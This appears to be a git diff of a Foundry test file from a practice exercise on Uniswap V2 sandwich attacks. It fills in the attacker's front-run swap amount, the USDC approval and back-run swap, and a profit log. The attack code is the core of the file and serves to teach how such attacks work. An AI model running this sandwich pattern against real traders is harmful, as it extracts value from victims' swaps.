@@ -2,6 +2,7 @@
 pragma solidity 0.8.17;
 
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 import { SandwichSetUp } from "./helper/SandwichSetUp.sol";
 
 contract SandwichPracticeTest is SandwichSetUp {
@@ -88,13 +89,9 @@ contract SandwichPracticeTest is SandwichSetUp {
         path[0] = address(weth);
         path[1] = address(usdc);
 
-        // # Discussion 1: how to get victim tx detail info ?
-        // without attacker action, original usdc amount out is 98715803, use 5% slippage
-        // originalUsdcAmountOutMin = 93780012;
-        uint256 originalUsdcAmountOut = 98715803;
-        uint256 originalUsdcAmountOutMin = (originalUsdcAmountOut * 95) / 100;
+        uint256 amountsETH = 2.6146599 ether;
 
-        uniswapV2Router.swapExactETHForTokens{ value: 1 ether }(
+        uniswapV2Router.swapExactETHForTokens{ value: amountsETH }(
             0,
             path,
             attacker,
@@ -112,8 +109,9 @@ contract SandwichPracticeTest is SandwichSetUp {
         path[0] = address(usdc);
         path[1] = address(weth);
 
+        usdc.approve(address(uniswapV2Router), usdc.balanceOf(attacker));
         uniswapV2Router.swapExactTokensForETH(
-            attacker.balance,
+            usdc.balanceOf(attacker),
             0,
             path,
             attacker,
@@ -125,6 +123,7 @@ contract SandwichPracticeTest is SandwichSetUp {
     // # Discussion 2: how to maximize profit ?
     function _checkAttackerProfit() internal {
         uint256 profit = attacker.balance - attackerInitialEthBalance;
+        console.log(profit);
         assertGt(profit, 0);
     }
 }
